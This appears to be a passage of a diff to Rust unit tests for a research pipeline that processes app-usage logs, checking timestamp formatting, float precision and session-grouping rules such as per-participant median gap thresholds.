+        options.minimum_usage_duration = 0.0;
+        options.micro_use_classification_policy = MicroUseClassificationPolicy::OkoshiLt5s;
+        options.micro_use_classification_policy_explicit = true;
+        let result = run_pipeline_v2_with_supports(
+            raw.as_bytes(),
+            &options,
+            PipelineV2SupportFiles::default(),
+        )
+        .expect("B03 full visualization projection");
+        let full: serde_json::Value =
+            serde_json::from_slice(&result.visualization_data_json_bytes.to_vec()).unwrap();
+        assert_eq!(full["protocolVersion"], VISUALIZATION_DATA_B03_PROTOCOL);
+        assert_eq!(full["appRows"][0][11], "micro_use");
     }
 
     #[test]
@@ -10594,7 +8164,7 @@ mod tests {
         options.interaction_type_remap = vec!["Unknown importance: 1 => Vendor Resume".into()];
         let result =
             run_pipeline_v2(csv.as_bytes(), &options, &[], &[], &[]).expect("remapped run");
-        let output = String::from_utf8(result.app_csv_bytes.as_ref().clone()).expect("UTF-8 CSV");
+        let output = String::from_utf8(result.app_csv_bytes.to_vec()).expect("UTF-8 CSV");
         assert!(output.contains("Vendor Resume"));
         assert!(!output.contains("App Usage"));
     }
@@ -10637,7 +8207,7 @@ mod tests {
         assert_eq!(result.original_row_count, 2);
         assert_eq!(result.processed_row_count, 2);
         assert_eq!(result.app_row_count, 1);
-        let output = String::from_utf8(result.app_csv_bytes.as_ref().clone()).expect("UTF-8 CSV");
+        let output = String::from_utf8(result.app_csv_bytes.to_vec()).expect("UTF-8 CSV");
         assert!(!output.contains("None"));
     }
 
@@ -10702,7 +8272,7 @@ mod tests {
             },
         )
         .expect("attribution run");
-        let output = String::from_utf8(result.app_csv_bytes.as_ref().clone()).unwrap();
+        let output = String::from_utf8(result.app_csv_bytes.to_vec()).unwrap();
         assert!(output.contains("Other (From Survey)"));
         assert!(output.contains(NON_TARGET_CHILD_APP_USAGE));
         assert!(output.contains("Target Child"));
@@ -10849,6 +8419,65 @@ mod tests {
         }
     }
 
+    /// The row writers' direct digits must equal the `write!`/`%:z` forms they
+    /// replaced, in every zone, for every representable nanosecond timestamp.
+    #[test]
+    fn direct_timestamp_digits_match_the_formatted_ones() {
+        let mut state = 0x9E37_79B9_7F4A_7C15_u64;
+        let mut timestamps = vec![
+            i64::MIN,
+            i64::MAX,
+            0,
+            -1,
+            -2_208_988_800_000_000_000, // 1900-01-01, historic local mean time
+            1_710_054_000_000_000_000,  // 2024-03-10, a US DST start
+            1_730_613_600_000_000_000,  // 2024-11-03, a US DST end
+        ];
+        for _ in 0..64 {
+            state ^= state << 13;
+            state ^= state >> 7;
+            state ^= state << 17;
+            timestamps.push(state as i64);
+        }
+        let mut checked = 0_usize;
+        for tz in chrono_tz::TZ_VARIANTS {
+            for &ts in &timestamps {
+                let local = ts_to_local(ts, tz);
+                for (direct, formatted) in [
+                    {
+                        let (mut direct, mut first) = (Vec::new(), true);
+                        emit_event_timestamp(&mut direct, ts, tz, &mut first);
+                        let mut formatted = Vec::new();
+                        write_event_timestamp_fmt(&mut formatted, &local);
+                        (direct, formatted)
+                    },
+                    {
+                        let (mut direct, mut first) = (Vec::new(), true);
+                        emit_session_timestamp(&mut direct, Some(ts), tz, &mut first);
+                        let mut formatted = Vec::new();
+                        write_session_timestamp_fmt(&mut formatted, &local);
+                        (direct, formatted)
+                    },
+                    {
+                        let (mut direct, mut first) = (Vec::new(), true);
+                        emit_screen_timestamp(&mut direct, Some(ts), tz, &mut first);
+                        let mut formatted = Vec::new();
+                        write_screen_timestamp_fmt(&mut formatted, &local);
+                        (direct, formatted)
+                    },
+                ] {
+                    assert_eq!(
+                        String::from_utf8(direct).unwrap(),
+                        String::from_utf8(formatted).unwrap(),
+                        "{tz} at {ts}",
+                    );
+                    checked += 1;
+                }
+            }
+        }
+        assert!(checked > 100_000, "only {checked} comparisons ran");
+    }
+
     /// Rows are written in timestamp order and overwhelmingly share a local
     /// date, so the date string is memoized. The memo has to answer for the
     /// date it was asked about: a year, month, or day change all have to miss.
@@ -10954,6 +8583,27 @@ mod tests {
     /// JavaScript original: `parseFloat(v.toPrecision(15)).toExponential()`
     /// with the two regex rewrites below 1e-4, and
     /// `String(parseFloat(v.toPrecision(17)))` with a forced `.0` above it.
+    /// `normalize_float_string` skips `round_to_precision(value, 17)` because it
+    /// cannot change a finite f64. Check that over edge values and a million
+    /// pseudo-random bit patterns spanning every exponent.
+    #[test]
+    fn precision_17_round_trip_is_the_identity() {
+        let mut values = vec![
+            f64::MIN_POSITIVE, f64::MAX, f64::MIN, f64::EPSILON, 5e-324, 1e-4, 0.1 + 0.2,
+            1.0 / 3.0, 9007199254740993.0, 1e21, 123_456_789.123_456_79,
+        ];
+        let mut state = 0x9e37_79b9_7f4a_7c15_u64;
+        for _ in 0..1_000_000 {
+            state ^= state << 13;
+            state ^= state >> 7;
+            state ^= state << 17;
+            values.push(f64::from_bits(state));
+        }
+        for value in values.into_iter().filter(|v| v.is_finite() && *v != 0.0) {
+            assert_eq!(round_to_precision(value, 17).to_bits(), value.to_bits(), "{value:e}");
+        }
+    }
+
     #[test]
     fn normalize_float_string_matches_the_javascript_renderer() {
         let cases: &[(f64, &str)] = &[
@@ -11105,21 +8755,1066 @@ mod tests {
 
     /// Build real canonical rows from raw events, so tests operate on the same
     /// values the pipeline does rather than on hand-assembled structs.
+    /// Build app-usage rows directly: session grouping reads only
+    /// participant, package and the reconstructed interval, so driving it
+    /// through a full reconstruction would test the matcher, not this.
+    fn session_usage_rows(episodes: &[(&str, &str, i64, i64)]) -> Vec<Row> {
+        episodes
+            .iter()
+            .map(|(participant, package, start, stop)| {
+                let mut row = rows_from_events(&[("2026-03-07 10:00:00", APP_USAGE, package)])
+                    .pop()
+                    .expect("one row");
+                {
+                    let data = row.edit_classification();
+                    *data.participant_id = intern_deserialized_str(participant);
+                    *data.app_package_name = intern_deserialized_str(package);
+                    *data.interaction_type = intern_deserialized_str(APP_USAGE);
+                }
+                {
+                    let data = row.edit_temporal();
+                    *data.start_timestamp_ns = Some(*start);
+                    *data.stop_timestamp_ns = Some(*stop);
+                }
+                row
+            })
+            .collect()
+    }
+
+    fn session_ids(
+        episodes: &[(&str, &str, i64, i64)],
+        policy: SessionGroupingPolicy,
+    ) -> Vec<Option<i64>> {
+        let mut rows = session_usage_rows(episodes);
+        assign_usage_session_ids(&mut rows, SessionGroupingRules::published(policy));
+        rows.iter().map(|row| row.usage_session_id).collect()
+    }
+
+    const SESSION_S: i64 = 1_000_000_000;
+
+    #[test]
+    fn session_grouping_is_off_by_default_and_numbers_from_zero_when_on() {
+        // Two episodes 10 s apart. With no policy nothing is numbered at all,
+        // which is what keeps existing output byte-identical.
+        let episodes = [
+            ("P01", "com.a", 0, 60 * SESSION_S),
+            ("P01", "com.b", 70 * SESSION_S, 90 * SESSION_S),
+        ];
+        assert_eq!(
+            session_ids(&episodes, SessionGroupingPolicy::None),
+            vec![None, None]
+        );
+        // Under a 60 s rule the 10 s gap does not break, so both are session 0
+        // — ids start at 0, not 1.
+        assert_eq!(
+            session_ids(&episodes, SessionGroupingPolicy::ZerrerSixtySeconds),
+            vec![Some(0), Some(0)],
+        );
+    }
+
+    /// The nested-episode defect reached through the WHOLE pipeline, on an
+    /// option combination the product exposes.
+    ///
+    /// A foreground switch closes the previous app only because "Activity
+    /// Resumed" is in `other_interaction_types_to_stop_usage_at` by default.
+    /// A researcher who removes it — a supported setting — gets sessions that
+    /// close only on their own stop, and therefore genuinely nested episodes.
+    /// The published gap basis then measures the next gap from the SHORT
+    /// nested episode and splits a session the participant never left.
+    #[test]
+    fn a_real_nested_episode_from_the_matcher_splits_only_under_the_published_basis() {
+        let csv = concat!(
+            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
+            // A runs 12:00 to 12:30. B opens and closes inside it. C starts 20 s
+            // after A closes, so nothing in this input is 60 s of silence.
+            "Study,P01,Target Child,A,Activity Resumed,com.example.a,2026-03-07 12:00:00,UTC\n",
+            "Study,P01,Target Child,B,Activity Resumed,com.example.b,2026-03-07 12:01:00,UTC\n",
+            "Study,P01,Target Child,B,Activity Paused,com.example.b,2026-03-07 12:02:00,UTC\n",
+            "Study,P01,Target Child,A,Activity Paused,com.example.a,2026-03-07 12:30:00,UTC\n",
+            "Study,P01,Target Child,C,Activity Resumed,com.example.c,2026-03-07 12:30:20,UTC\n",
+            "Study,P01,Target Child,C,Activity Paused,com.example.c,2026-03-07 12:31:00,UTC\n",
+        );
+
+        let sessions = |options: &PipelineV2Options| -> Vec<String> {
+            let out = run_pipeline_v2_with_supports(
+                csv.as_bytes(),
+                options,
+                PipelineV2SupportFiles::default(),
+            )
+            .expect("the run succeeds");
+            parse_csv_to_records_with_physical_rows(&out.app_csv_bytes.to_vec())
+                .iter()
+                .map(|(_, row)| {
+                    row.get("usage_session_id")
+                        .cloned()
+                        .expect("a grouped run publishes the session column")
+                })
+                .collect()
+        };
+
+        let mut options = test_options();
+        options.session_grouping_policy = SessionGroupingPolicy::ZerrerSixtySeconds;
+
+        // With the default other-stop list a foreground switch closes A at
+        // 12:01, so no episode overlaps and the two bases cannot differ.
+        assert_eq!(sessions(&options), vec!["0", "0", "1"]);
+        let mut running_max = options.clone();
+        running_max.session_gap_basis = SessionGapBasis::SessionRunningMaximumStop;
+        assert_eq!(
+            sessions(&running_max),
+            vec!["0", "0", "1"],
+            "with no overlap the basis cannot change the numbering",
+        );
+
+        // Remove the foreground-switch close. A now runs its full 30 min with B
+        // nested inside it — the shape the published rules were never stated
+        // over.
+        options.other_stop_types = vec!["Device Shutdown".into()];
+        assert_eq!(
+            sessions(&options),
+            vec!["0", "0", "1"],
+            "the published basis measures C's gap from the nested episode and splits",
+        );
+
+        running_max = options.clone();
+        running_max.session_gap_basis = SessionGapBasis::SessionRunningMaximumStop;
+        assert_eq!(
+            sessions(&running_max),
+            vec!["0", "0", "0"],
+            "measuring from the session's furthest stop sees the real 20 s gap",
+        );
+
+        // And the lineage says which number each verdict rested on, so the two
+        // runs can be told apart from the output alone.
+        running_max.emit_session_break_lineage = true;
+        let out = run_pipeline_v2_with_supports(
+            csv.as_bytes(),
+            &running_max,
+            PipelineV2SupportFiles::default(),
+        )
+        .expect("the lineage run succeeds");
+        let flags: Vec<String> = parse_csv_to_records_with_physical_rows(&out.app_csv_bytes.to_vec())
+            .iter()
+            .map(|(_, row)| {
+                row.get("any_app_usage_flags")
+                    .cloned()
+                    .expect("the flags column is always published")
+            })
+            .collect();
+        assert_eq!(
+            flags,
+            vec![
+                "['SESSION 0 OPEN']".to_string(),
+                // B starts 60 s after A starts but INSIDE it, so the gap from
+                // the running maximum is negative.
+                "['SESSION 0 JOIN GAP -1740 S']".to_string(),
+                "['SESSION 0 JOIN GAP 20 S']".to_string(),
+            ],
+        );
+    }
+
+    /// Build episodes carrying a study id and a username as well, so the two
+    /// classification dimensions that vary WITHIN a participant can be tested.
+    /// The four-tuple helper above cannot express either.
+    fn scoped_usage_rows(episodes: &[(&str, &str, &str, &str, i64, i64)]) -> Vec<Row> {
+        episodes
+            .iter()
+            .map(|(study, participant, username, package, start, stop)| {
+                let mut row = rows_from_events(&[("2026-03-07 10:00:00", APP_USAGE, package)])
+                    .pop()
+                    .expect("one row");
+                {
+                    let data = row.edit_classification();
+                    *data.study_id = intern_deserialized_str(study);
+                    *data.participant_id = intern_deserialized_str(participant);
+                    *data.username = intern_deserialized_str(username);
+                    *data.app_package_name = intern_deserialized_str(package);
+                    *data.interaction_type = intern_deserialized_str(APP_USAGE);
+                }
+                {
+                    let data = row.edit_temporal();
+                    *data.start_timestamp_ns = Some(*start);
+                    *data.stop_timestamp_ns = Some(*stop);
+                }
+                row
+            })
+            .collect()
+    }
+
+    fn scoped_session_ids(
+        episodes: &[(&str, &str, &str, &str, i64, i64)],
+        rules: SessionGroupingRules,
+    ) -> Vec<Option<i64>> {
+        let mut rows = scoped_usage_rows(episodes);
+        assign_usage_session_ids(&mut rows, rules);
+        rows.iter().map(|row| row.usage_session_id).collect()
+    }
+
+    fn scoped_flags(
+        episodes: &[(&str, &str, &str, &str, i64, i64)],
+        rules: SessionGroupingRules,
+    ) -> Vec<String> {
+        let mut rows = scoped_usage_rows(episodes);
+        assign_usage_session_ids(&mut rows, rules);
+        rows.iter()
+            .map(|row| row.any_app_usage_flags.to_string())
+            .collect()
+    }
+
+    /// Peng & Zhu (2020): "the median score of a user's inter-app intervals
+    /// is adopted for each user" — one file, two participants, two different
+    /// thresholds. The same 200 s of silence joins for the participant whose
+    /// median is 300 s and would break for the one whose median is 10 s.
+    #[test]
+    fn peng_zhu_derives_a_separate_median_per_participant() {
+        let episodes = [
+            // P01 gaps in start order: 5 s, 10 s, 100 s → median 10 s.
+            ("P01", "com.a", 0, 10 * SESSION_S),
+            ("P01", "com.a", 15 * SESSION_S, 25 * SESSION_S),
+            ("P01", "com.a", 35 * SESSION_S, 45 * SESSION_S),
+            ("P01", "com.a", 145 * SESSION_S, 155 * SESSION_S),
+            // P02 gaps: 200 s, 300 s, 400 s → median 300 s.
+            ("P02", "com.b", 0, 10 * SESSION_S),
+            ("P02", "com.b", 210 * SESSION_S, 220 * SESSION_S),
+            ("P02", "com.b", 520 * SESSION_S, 530 * SESSION_S),
+            ("P02", "com.b", 930 * SESSION_S, 940 * SESSION_S),
+        ];
+        assert_eq!(
+            session_ids(
+                &episodes,
+                SessionGroupingPolicy::PengZhu2020ParticipantMedian
+            ),
+            vec![
+                // P01: 5 < 10 joins; 10 >= 10 breaks; 100 breaks.
+                Some(0),
+                Some(0),
+                Some(1),
+                Some(2),
+                // P02: 200 < 300 joins — the gap that would break P01 —
+                // 300 >= 300 breaks; 400 breaks.
+                Some(0),
+                Some(0),
+                Some(1),
+                Some(2),
+            ],
+        );
+    }
+
+    /// The comparison is integer-exact at the boundary, including the
+    /// half-nanosecond median an even interval count can produce: gaps of
+    /// [10, 15, 16, 21] ns have median 15.5 ns, a value no gap can ever
+    /// equal, and the doubled-space comparison places 15 ns (join) and 16 ns
+    /// (break) on the correct sides without any rounding.
+    #[test]
+    fn peng_zhu_boundary_is_exact_including_half_nanosecond_medians() {
+        // Odd count, whole median: gaps 10 s, 20 s, 40 s → median 20 s.
+        // Equality splits ("smaller than … joins"), one nanosecond less joins.
+        let odd = [
+            ("P01", "com.a", 0, 10 * SESSION_S),
+            ("P01", "com.a", 20 * SESSION_S, 30 * SESSION_S),
+            ("P01", "com.a", 50 * SESSION_S, 60 * SESSION_S),
+            ("P01", "com.a", 100 * SESSION_S, 110 * SESSION_S),
+        ];
+        assert_eq!(
+            session_ids(&odd, SessionGroupingPolicy::PengZhu2020ParticipantMedian),
+            vec![Some(0), Some(0), Some(1), Some(2)],
+            "10 < 20 joins; exactly 20 breaks; 40 breaks",
+        );
+        // Nudging a gap moves the median it is compared against — the probed
+        // gap is itself part of the statistic — so the one-nanosecond-inside
+        // probe needs an even count where the two middle gaps straddle it:
+        // gaps 10 s, 20 s − 1 ns, 20 s, 40 s give a doubled median of
+        // 40 s − 1 ns (median 20 s − 0.5 ns). The 20 s − 1 ns gap sits one
+        // nanosecond inside and joins; the exact 20 s gap sits half a
+        // nanosecond beyond and breaks.
+        let just_under = [
+            ("P01", "com.a", 0, 10 * SESSION_S),
+            ("P01", "com.a", 20 * SESSION_S, 30 * SESSION_S),
+            ("P01", "com.a", 50 * SESSION_S - 1, 60 * SESSION_S),
+            ("P01", "com.a", 80 * SESSION_S, 90 * SESSION_S),
+            ("P01", "com.a", 130 * SESSION_S, 140 * SESSION_S),
+        ];
+        assert_eq!(
+            session_ids(
+                &just_under,
+                SessionGroupingPolicy::PengZhu2020ParticipantMedian
+            ),
+            vec![Some(0), Some(0), Some(0), Some(1), Some(2)],
+        );
+
+        // Even count at nanosecond scale: gaps 10, 21, 15, 16 ns in start
+        // order sort to [10, 15, 16, 21] → doubled median 31 ns.
+        let half = [
+            ("P01", "com.a", 0, 100),
+            ("P01", "com.a", 110, 200), // gap 10 ns: 20 < 31 joins
+            ("P01", "com.a", 221, 300), // gap 21 ns: 42 >= 31 breaks
+            ("P01", "com.a", 315, 400), // gap 15 ns: 30 < 31 joins
+            ("P01", "com.a", 416, 500), // gap 16 ns: 32 >= 31 breaks
+        ];
+        assert_eq!(
+            session_ids(&half, SessionGroupingPolicy::PengZhu2020ParticipantMedian),
+            vec![Some(0), Some(0), Some(1), Some(1), Some(2)],
+        );
+    }
+
+    /// Degenerate partitions stay deterministic with no invented knobs: one
+    /// episode has no interval and nothing to compare; two episodes have one
+    /// interval, the median IS that gap, and equality splits — their rule
+    /// applied verbatim, not a special case.
+    #[test]
+    fn peng_zhu_degenerate_partitions_follow_the_rule_verbatim() {
+        assert_eq!(
+            session_ids(
+                &[("P01", "com.a", 0, 10 * SESSION_S)],
+                SessionGroupingPolicy::PengZhu2020ParticipantMedian,
+            ),
+            vec![Some(0)],
+        );
+        assert_eq!(
+            session_ids(
+                &[
+                    ("P01", "com.a", 0, 10 * SESSION_S),
+                    ("P01", "com.a", 20 * SESSION_S, 30 * SESSION_S),
+                ],
+                SessionGroupingPolicy::PengZhu2020ParticipantMedian,
+            ),
+            vec![Some(0), Some(1)],
+            "one interval: the gap equals its own median and splits",
+        );
+    }
+
+    /// The derived threshold is reconstructible from the export: the OPEN flag
+    /// names the partition's median and the interval count it was computed
+    /// over, in the same `js_number_to_string` rendering every other flag
+    /// uses — including a fractional median.
+    #[test]
+    fn peng_zhu_lineage_names_the_median_and_its_interval_count() {
+        let rules = SessionGroupingRules {
+            policy: SessionGroupingPolicy::PengZhu2020ParticipantMedian,
+            emit_lineage: true,
+            ..SessionGroupingRules::default()
+        };
+        // Gaps 10 s, 15 s, 20 s → median 15 s over 3 intervals.
+        assert_eq!(
+            scoped_flags(
+                &[
+                    ("S", "P01", "Target Child", "com.a", 0, 10 * SESSION_S),
+                    (
+                        "S",
+                        "P01",
+                        "Target Child",
+                        "com.a",
+                        20 * SESSION_S,
+                        30 * SESSION_S,
+                    ),
+                    (
+                        "S",
+                        "P01",
+                        "Target Child",
+                        "com.a",
+                        45 * SESSION_S,
+                        55 * SESSION_S,
+                    ),
+                    (
+                        "S",
+                        "P01",
+                        "Target Child",
+                        "com.a",
+                        75 * SESSION_S,
+                        85 * SESSION_S,
+                    ),
+                ],
+                rules,
+            ),
+            vec![
+                "['SESSION 0 OPEN MEDIAN 15 S N 3']".to_string(),
+                "['SESSION 0 JOIN GAP 10 S']".to_string(),
+                "['SESSION 1 BREAK GAP 15 S']".to_string(),
+                "['SESSION 2 BREAK GAP 20 S']".to_string(),
+            ],
+        );
+        // Gaps 10 s and 21 s → median 15.5 s over 2 intervals: the halved
+        // doubled median renders exactly, not as a rounded integer.
+        assert_eq!(
+            scoped_flags(
+                &[
+                    ("S", "P01", "Target Child", "com.a", 0, 10 * SESSION_S),
+                    (
+                        "S",
+                        "P01",
+                        "Target Child",
+                        "com.a",
+                        20 * SESSION_S,
+                        30 * SESSION_S,
+                    ),
+                    (
+                        "S",
+                        "P01",
+                        "Target Child",
+                        "com.a",
+                        51 * SESSION_S,
+                        61 * SESSION_S,
+                    ),
+                ],
+                rules,
+            ),
+            vec![
+                "['SESSION 0 OPEN MEDIAN 15.5 S N 2']".to_string(),
+                "['SESSION 0 JOIN GAP 10 S']".to_string(),
+                "['SESSION 1 BREAK GAP 21 S']".to_string(),
+            ],
+        );
+        // A one-episode partition has no intervals and the OPEN flag says
+        // nothing it cannot know.
+        assert_eq!(
+            scoped_flags(
+                &[("S", "P01", "Target Child", "com.a", 0, 10 * SESSION_S)],
+                rules,
+            ),
+            vec!["['SESSION 0 OPEN']".to_string()],
+        );
+    }
+
+    /// The median is derived from previous-stop → next-start intervals even
+    /// when the WALK measures its gaps from the running-maximum stop.
+    /// Deriving it from the running-maximum reading would be circular — that
+    /// reading depends on which episodes are already in the session — so the
+    /// statistic is fixed and only the comparison follows the basis. The OPEN
+    /// flag must therefore name the same median under both bases.
+    #[test]
+    fn peng_zhu_median_ignores_the_gap_basis_departure() {
+        // A covers 30 min with B nested inside it; C starts 20 s after A ends.
+        // Previous-stop intervals: B − A = −1740 s, C − B = 1700 s → the
+        // median is (−1740 + 1700) / 2 = −20 s under BOTH bases.
+        let episodes = [
+            ("S", "P01", "Target Child", "com.a", 0, 1800 * SESSION_S),
+            (
+                "S",
+                "P01",
+                "Target Child",
+                "com.b",
+                60 * SESSION_S,
+                120 * SESSION_S,
+            ),
+            (
+                "S",
+                "P01",
+                "Target Child",
+                "com.c",
+                1820 * SESSION_S,
+                1860 * SESSION_S,
+            ),
+        ];
+        let published = SessionGroupingRules {
+            policy: SessionGroupingPolicy::PengZhu2020ParticipantMedian,
+            emit_lineage: true,
+            ..SessionGroupingRules::default()
+        };
+        let running_max = SessionGroupingRules {
+            gap_basis: SessionGapBasis::SessionRunningMaximumStop,
+            ..published
+        };
+        let published_flags = scoped_flags(&episodes, published);
+        let running_max_flags = scoped_flags(&episodes, running_max);
+        assert_eq!(
+            published_flags[0], "['SESSION 0 OPEN MEDIAN -20 S N 2']",
+            "the derived median is the previous-stop statistic",
+        );
+        assert_eq!(
+            running_max_flags[0], published_flags[0],
+            "the basis departure must not move the derived median",
+        );
+        // The comparisons still follow the basis: B's gap is −1740 s either
+        // way, but C's is 1700 s from B's stop and 20 s from the session's
+        // furthest stop — both at or above −20 s, so both bases break at C.
+        assert_eq!(
+            scoped_session_ids(&episodes, published),
+            vec![Some(0), Some(0), Some(1)],
+        );
+        assert_eq!(
+            scoped_session_ids(&episodes, running_max),
+            vec![Some(0), Some(0), Some(1)],
+        );
+        assert_eq!(running_max_flags[2], "['SESSION 1 BREAK GAP 20 S']");
+        assert_eq!(published_flags[2], "['SESSION 1 BREAK GAP 1700 S']");
+    }
+
+    /// The doubled-space comparison is exactly the old comparison for every
+    /// fixed arm, probed at the only points where a rewrite could move it:
+    /// one nanosecond inside the constant, exactly the constant, and one
+    /// nanosecond beyond it.
+    #[test]
+    fn fixed_arms_keep_their_exact_boundaries_under_the_doubled_comparison() {
+        for policy in SessionGroupingPolicy::ALL {
+            let Some(SessionGapThreshold::FixedNs(t)) = policy.gap_threshold() else {
+                continue;
+            };
+            let ids_for_gap = |gap: i64| {
+                session_ids(
+                    &[
+                        ("P01", "com.a", 0, 10 * SESSION_S),
+                        ("P01", "com.a", 10 * SESSION_S + gap, 20 * SESSION_S + gap),
+                    ],
+                    *policy,
+                )
+            };
+            assert_eq!(
+                ids_for_gap(t - 1),
+                vec![Some(0), Some(0)],
+                "{}: one nanosecond inside the constant joins",
+                policy.canonical_id(),
+            );
+            let at_boundary = if policy.boundary_gap_starts_new_session() {
+                vec![Some(0), Some(1)]
+            } else {
+                vec![Some(0), Some(0)]
+            };
+            assert_eq!(
+                ids_for_gap(t),
+                at_boundary,
+                "{}: the boundary keeps its published side",
+                policy.canonical_id(),
+            );
+            assert_eq!(
+                ids_for_gap(t + 1),
+                vec![Some(0), Some(1)],
+                "{}: one nanosecond beyond the constant breaks",
+                policy.canonical_id(),
+            );
+        }
+    }
+
+    /// An episode nested inside a longer one pulls the measuring point
+    /// backwards, so the published reading splits a session the participant
+    /// never left. This is the defect the gap-basis axis exists for, and both
+    /// readings are pinned so neither can be changed silently.
+    #[test]
+    fn a_nested_episode_splits_a_session_only_under_the_published_gap_basis() {
+        // A runs for 30 min. B is nested entirely inside it. C starts 20 s
+        // after A ends, so the participant's screen was covered continuously
+        // and no 60 s silence exists anywhere in this input.
+        let episodes = [
+            ("P01", "com.a", 0, 1800 * SESSION_S),
+            ("P01", "com.b", 60 * SESSION_S, 120 * SESSION_S),
+            ("P01", "com.c", 1820 * SESSION_S, 1860 * SESSION_S),
+        ];
+
+        // Published: the gap for C is measured from B's stop, 28 min 20 s.
+        assert_eq!(
+            session_ids(&episodes, SessionGroupingPolicy::ZerrerSixtySeconds),
+            vec![Some(0), Some(0), Some(1)],
+            "the published reading measures from the nested episode and splits",
+        );
+
+        // Running maximum: the gap for C is measured from A's stop, 20 s.
+        assert_eq!(
+            scoped_session_ids(
+                &[
+                    ("S", "P01", "Target Child", "com.a", 0, 1800 * SESSION_S),
+                    (
+                        "S",
+                        "P01",
+                        "Target Child",
+                        "com.b",
+                        60 * SESSION_S,
+                        120 * SESSION_S,
+                    ),
+                    (
+                        "S",
+                        "P01",
+                        "Target Child",
+                        "com.c",
+                        1820 * SESSION_S,
+                        1860 * SESSION_S,
+                    ),
+                ],
+                SessionGroupingRules {
+                    policy: SessionGroupingPolicy::ZerrerSixtySeconds,
+                    gap_basis: SessionGapBasis::SessionRunningMaximumStop,
+                    ..SessionGroupingRules::default()
+                },
+            ),
+            vec![Some(0), Some(0), Some(0)],
+            "measuring from the session's furthest stop keeps the coverage together",
+        );
+
+        // With no overlap anywhere the two bases must agree exactly, which is
+        // what makes the departure narrow: it can only ever affect an input the
+        // published rules were not stated over.
+        let disjoint = [
+            ("S", "P01", "Target Child", "com.a", 0, 60 * SESSION_S),
+            (
+                "S",
+                "P01",
+                "Target Child",
+                "com.b",
+                70 * SESSION_S,
+                90 * SESSION_S,
+            ),
+            (
+                "S",
+                "P01",
+                "Target Child",
+                "com.c",
+                200 * SESSION_S,
+                210 * SESSION_S,
+            ),
+        ];
+        assert_eq!(
+            scoped_session_ids(&disjoint, SessionGroupingRules::default_policy_only()),
+            scoped_session_ids(
+                &disjoint,
+                SessionGroupingRules {
+                    gap_basis: SessionGapBasis::SessionRunningMaximumStop,
+                    ..SessionGroupingRules::default_policy_only()
+                },
+            ),
+        );
+    }
+
+    /// A row belonging to another study, or to another person on a shared
+    /// device, lands inside a participant's silence and bridges it. The
+    /// participant's session is then never split — a MISSED break, not a
+    /// spurious one, which is why no existing test caught it.
+    #[test]
+    fn a_foreign_row_bridges_a_silence_until_the_boundary_scope_is_widened() {
+        // Study A is silent from 60 s to 1010 s — 950 s, far past any policy's
+        // threshold. Study B's episode sits inside that silence.
+        let across_studies = [
+            ("StudyA", "P01", "Target Child", "com.a", 0, 60 * SESSION_S),
+            (
+                "StudyB",
+                "P01",
+                "Target Child",
+                "com.b",
+                65 * SESSION_S,
+                1000 * SESSION_S,
+            ),
+            (
+                "StudyA",
+                "P01",
+                "Target Child",
+                "com.a",
+                1010 * SESSION_S,
+                1020 * SESSION_S,
+            ),
+        ];
+        assert_eq!(
+            scoped_session_ids(&across_studies, SessionGroupingRules::default_policy_only()),
+            vec![Some(0), Some(0), Some(0)],
+            "partitioning by participant alone lets the other study bridge the silence",
+        );
+        assert_eq!(
+            scoped_session_ids(
+                &across_studies,
+                SessionGroupingRules {
+                    scope: SessionBoundaryScope::ParticipantAndStudy,
+                    ..SessionGroupingRules::default_policy_only()
+                },
+            ),
+            vec![Some(0), Some(0), Some(1)],
+            "adding study_id splits study A's 950 s silence and numbers study B alone",
+        );
+
+        // The same shape one level down: two people on one shared device, with
+        // no device-sharing file configured to reclassify either.
+        let across_people = [
+            ("StudyA", "P01", "Target Child", "com.a", 0, 60 * SESSION_S),
+            (
+                "StudyA",
+                "P01",
+                "Sibling",
+                "com.b",
+                65 * SESSION_S,
+                1000 * SESSION_S,
+            ),
+            (
+                "StudyA",
+                "P01",
+                "Target Child",
+                "com.a",
+                1010 * SESSION_S,
+                1020 * SESSION_S,
+            ),
+        ];
+        assert_eq!(
+            scoped_session_ids(
+                &across_people,
+                SessionGroupingRules {
+                    scope: SessionBoundaryScope::ParticipantAndStudy,
+                    ..SessionGroupingRules::default_policy_only()
+                },
+            ),
+            vec![Some(0), Some(0), Some(0)],
+            "study scope cannot see the sibling; the silence is still bridged",
+        );
+        assert_eq!(
+            scoped_session_ids(
+                &across_people,
+                SessionGroupingRules {
+                    scope: SessionBoundaryScope::ParticipantStudyAndPerson,
+                    ..SessionGroupingRules::default_policy_only()
+                },
+            ),
+            vec![Some(0), Some(0), Some(1)],
+            "adding username separates the two people on the shared device",
+        );
+    }
+
+    /// The lineage flag states which rule placed each row and what gap it saw.
+    /// It rides in `any_app_usage_flags`, so a run with it on is
+    /// schema-compatible with one with it off.
+    #[test]
+    fn session_break_lineage_names_the_rule_and_the_observed_gap() {
+        let episodes = [
+            ("S", "P01", "Target Child", "com.a", 0, 60 * SESSION_S),
+            (
+                "S",
+                "P01",
+                "Target Child",
+                "com.b",
+                70 * SESSION_S,
+                90 * SESSION_S,
+            ),
+            (
+                "S",
+                "P01",
+                "Target Child",
+                "com.c",
+                200 * SESSION_S,
+                210 * SESSION_S,
+            ),
+        ];
+
+        // Off: the flags column keeps the empty-list value it arrived with.
+        // Nothing is appended at all, which is what keeps the app table
+        // byte-identical when the axis is not selected.
+        assert_eq!(
+            scoped_flags(&episodes, SessionGroupingRules::default_policy_only()),
+            vec!["[]".to_string(), "[]".to_string(), "[]".to_string()],
+        );
+
+        assert_eq!(
+            scoped_flags(
+                &episodes,
+                SessionGroupingRules {
+                    emit_lineage: true,
+                    ..SessionGroupingRules::default_policy_only()
+                },
+            ),
+            vec![
+                "['SESSION 0 OPEN']".to_string(),
+                "['SESSION 0 JOIN GAP 10 S']".to_string(),
+                "['SESSION 1 BREAK GAP 110 S']".to_string(),
+            ],
+            "the flag names the session, the verdict and the gap it measured",
+        );
+
+        // Ross is the only policy with a package clause, and the flag says so
+        // rather than leaving a 1 s gap looking like the cause of the break.
+        assert_eq!(
+            scoped_flags(
+                &[
+                    ("S", "P01", "Target Child", "com.a", 0, 60 * SESSION_S),
+                    (
+                        "S",
+                        "P01",
+                        "Target Child",
+                        "com.b",
+                        61 * SESSION_S,
+                        70 * SESSION_S,
+                    ),
+                ],
+                SessionGroupingRules {
+                    policy: SessionGroupingPolicy::RossFifteenSeconds,
+                    emit_lineage: true,
+                    ..SessionGroupingRules::default()
+                },
+            ),
+            vec![
+                "['SESSION 0 OPEN']".to_string(),
